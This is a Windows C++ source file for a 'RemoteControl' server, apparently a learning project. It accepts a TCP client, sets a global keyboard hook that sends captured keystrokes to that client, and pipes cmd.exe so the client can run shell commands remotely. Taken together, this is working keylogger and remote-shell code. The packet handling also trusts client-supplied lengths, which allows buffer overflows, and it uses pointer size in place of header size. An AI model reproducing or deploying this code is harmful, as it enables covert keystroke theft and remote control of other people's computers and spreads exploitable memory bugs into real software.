// Server_with_Window.cpp : Defines the entry point for the application.
//

#include "framework.h"
#include "Server_with_Window.h"
#include "MyDll.h"
#include "sock.h"
#include "DataPacket.h"
#include "pipe.h"
#include "error.h"

#ifdef _DEBUG
#pragma comment(lib, "..\\..\\..\\bin\\RemoteControl\\Debug\\KeyHook.lib")
#else
#pragma comment(lib, "..\\..\\..\\bin\\RemoteControl\\Release\\KeyHook.lib")
#endif

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;                                // current instance
SOCKET sAccept;									// socket connected
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

// Forward declarations of functions included in this code module:
DWORD WINAPI		RecvCommand(LPVOID lpParam);		//receive user command from client
DWORD WINAPI		SendResults(LPVOID lpParam);		//send results(cmd.exe) to client
ATOM                MyRegisterClass(HINSTANCE hInstance);
HWND				InitInstance(HINSTANCE hInstance, int nCmdShow);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_SERVERWITHWINDOW, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // Perform application initialization:
	HWND hMainWnd = InitInstance(hInstance, nCmdShow);// main window handle
    if (!hMainWnd)
    {
        return FALSE;
    }

	//establish TCP communication
	SOCKET sListen = InitSocket();

	if (sListen == INVALID_SOCKET)
	{
		PrintError();
		WSACleanup();
		return FALSE;
	}

	sAccept = WaitConnection(sListen);

	if (sAccept == INVALID_SOCKET)
	{
		PrintError();
		closesocket(sListen);
		WSACleanup();
		return FALSE;
	}

	//set flag, socket would not be inherited. 
	SetHandleInformation((HANDLE)sListen, HANDLE_FLAG_INHERIT, 0);
	SetHandleInformation((HANDLE)sAccept, HANDLE_FLAG_INHERIT, 0);

	// set keyboard hook
	if (!SetKeyHook(hMainWnd))
	{
		PrintError();
		closesocket(sAccept);
		closesocket(sListen);
		WSACleanup();
		return FALSE;
	}

	// redirect cmd.exe
	HANDLE hWriteCmd; // the writing end of the pipe of sending command
	HANDLE hReadCmd; // the reading  end of the pipe of receiving results
	RedirectCmd(hWriteCmd, hReadCmd);

	// Create thread to receive command from client
	HANDLE hRecvThread = CreateThread(NULL, 0, RecvCommand, (LPVOID)hWriteCmd, 0, NULL);

	// Create thread to send results
	HANDLE hSendThread = CreateThread(NULL, 0, SendResults, (LPVOID)hReadCmd, 0, NULL);

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_SERVERWITHWINDOW));

    MSG msg;

    // Main message loop:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

	UnKeyHook();
	closesocket(sAccept);
	closesocket(sListen);
	WSACleanup();
    return (int) msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SERVERWITHWINDOW));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_SERVERWITHWINDOW);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
HWND InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // Store instance handle in our global variable

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return NULL;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return hWnd;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE: Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
	case WM_COPYDATA:
		{
			PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;
			BYTE SendBuffer[256];
			DataPacket* pPkt = (DataPacket*)SendBuffer;

			//组包
			pPkt->type = PACKET_RLY_KEYBOARD;
			pPkt->len = pcds->cbData;
			memcpy(pPkt->data, pcds->lpData, pcds->cbData);

			SendBytes(sAccept, (char*)pPkt, sizeof(pPkt) + pPkt->len);
		}
		break;
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // Parse the menu selections:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: Add any drawing code that uses hdc here...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}


DWORD WINAPI RecvCommand(LPVOID lpParam) //receive user command from client
{
	HANDLE hWriteCmd = (HANDLE)lpParam;

	while (TRUE)
	{
		char RecvBuffer[1000] = { 0 };
		DataPacket* pPkt = (DataPacket*)RecvBuffer;

		//recv header
		RecvBytes(sAccept, (char*)pPkt, sizeof(DataPacket));

		//recv data
		RecvBytes(sAccept, pPkt->data, pPkt->len);

		//handle data according to data type
		if (pPkt->type == PACKET_REQ_CMD)
		{
			DWORD BytesWritten;
			WriteFile(hWriteCmd, pPkt->data, pPkt->len, &BytesWritten, NULL);
		}
	}
}

DWORD WINAPI SendResults(LPVOID lpParam) //send results(cmd.exe) to client
{
	HANDLE hReadCmd = (HANDLE)lpParam;

	while (TRUE)
	{
		char SendBuffer[1000] = { 0 };
		DataPacket* pPkt = (DataPacket*)SendBuffer;

		//组包
		DWORD BytesRead;
		ReadFile(hReadCmd, pPkt->data, sizeof(SendBuffer) - sizeof(DataPacket), &BytesRead, NULL);

		pPkt->type = PACKET_RLY_CMD;
		pPkt->len = (WORD)BytesRead;

		SendBytes(sAccept, (char*)pPkt, pPkt->len + sizeof(pPkt));
	}
}